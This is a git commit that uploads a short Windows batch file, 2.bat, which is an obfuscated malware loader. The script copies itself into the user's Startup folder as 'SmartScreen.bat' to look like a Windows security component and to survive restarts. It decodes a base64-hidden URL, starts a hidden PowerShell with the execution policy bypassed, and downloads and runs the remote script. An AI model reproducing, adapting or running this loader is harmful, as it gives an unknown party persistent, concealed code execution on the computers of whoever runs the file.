b53b8ad665774148a9e652fedbf34b9dec8b3089
poxxc56 <poxxcon2@protonmail.com>
2025-05-24 15:51:22 -0700

    Add files via upload

---
+++ 2.bat
@@ -0,0 +1,9 @@
+@Echo off
+Set "tdXehZCJ=%~f0"
+sET "AMAuiUgt=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\SmartScreen.bat"
+CopY /Y "%tdXehZCJ%" "%AMAuiUgt%" >nul
+SET "jVZfKvJU=aHR0cHM6Ly9jb2RlYmVyZy5vcmcvbGVvY29sL2RsbC9yYXcvYnJhbmNoL21haW4vT1VFSFJSSC5wczE="
+Set LiKHyddr=poWersHelL
+STart "" /b cONHoST.EXe --headless -- PowERSHelL -EXeCUTioNpolICY bypaSS -comManD "& { $u=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('%jVZfKvJU%'));(new-oBjECT SYStEm.nEt.WEbclIent).DOwNLoadSTrING($u) | invOKE-eXprEssIon }"
+tIMEOUt /t 1 /nobreak >nul
+eXiT
